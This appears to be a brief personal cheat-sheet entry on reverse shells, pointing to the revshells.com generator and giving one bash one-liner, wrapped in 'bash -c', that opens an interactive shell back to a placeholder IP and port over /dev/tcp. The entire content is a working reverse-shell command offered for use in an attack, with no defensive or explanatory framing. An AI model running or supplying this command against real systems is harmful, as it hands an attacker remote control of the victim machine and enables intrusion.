Primarily use [revshells](https://revshells.com)

Bash executing bash (not found on revshells.com):
```
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```